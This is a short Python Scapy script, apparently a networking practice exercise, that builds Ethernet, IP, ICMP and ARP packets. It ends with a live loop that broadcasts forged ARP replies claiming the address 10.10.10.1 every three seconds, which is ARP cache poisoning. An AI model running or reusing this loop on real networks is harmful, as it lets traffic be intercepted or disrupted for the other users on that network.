# In the name of God

# import library

from scapy.all import *
# create different layers of TCP/IP
packet = IP(src= '10.10.10.200', dst='10.10.10.1')
frame = Ether(src='00:00:00:00:00:01', dst='64:d1:54:74:f6:1c')
tcp = TCP(sport=4000, dport=80)
udp = TCP(sport=4001, dport=53)

# create an Icmp packet with default values
icmp_packet = IP(src='10.10.10.2', dst='10.10.10.1')/ICMP()
# send(icmp_packet, iface='wlp1s0', verbose=1, loop=False)

################## create a packet from scratch

# define variable for use in packets/frames
# src_mac = 'c4:9d:ed:17:aa:09'
src_mac = '00:00:00:00:00:1'
dst_mac = 'ff:ff:ff:ff:ff:ff'
src_ip = '10.10.10.200'
dst_ip = '10.10.10.1'

# create diferent Layers of TCP/IP from scratch
l2 = Ether(src=src_mac, dst=dst_mac)
l3 = IP(src=src_ip, dst=dst_ip)
icmp = ICMP(type=8, code=0)
raw_payload = 'This is a Ethical Test'
raw2_payload = 'this is an test2'

# craft an ICMP packet with different Layers
icmp_packet = l2/l3/icmp/raw_payload/raw2_payload

# show the packet [optional]
# icmp_packet.show()

# send packet
# sendp(icmp_packet, verbose=True, loop=False, iface='wlp1s0')

# create an ARP reply packet
arp_replay_payload = ARP(op=2, pdst='10.10.10.188', hwdst='e4:5f:01:88:4a:ac', psrc='10.10.10.200')

arp_replay_payload.show()

send(arp_replay_payload, iface='wlp1s0', verbose=True, loop=False)

# create an ARP reply packet from scratch

src_mac = 'c4:9d:ed:17:aa:09'
dst_mac = 'ff:ff:ff:ff:ff:ff'
claimed_ip = '10.10.10.1'
dst_ip = '10.10.10.255'
claimed_mac = src_mac

arp_replay_payload = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=claimed_ip, hwsrc=claimed_mac)
l2 = Ether(src=src_mac, dst=dst_mac)
arp = l2/arp_replay_payload ###############

while True:
    arp.show()
    sendp(arp, iface='wlp1s0', loop=False)
    time.sleep(3)

























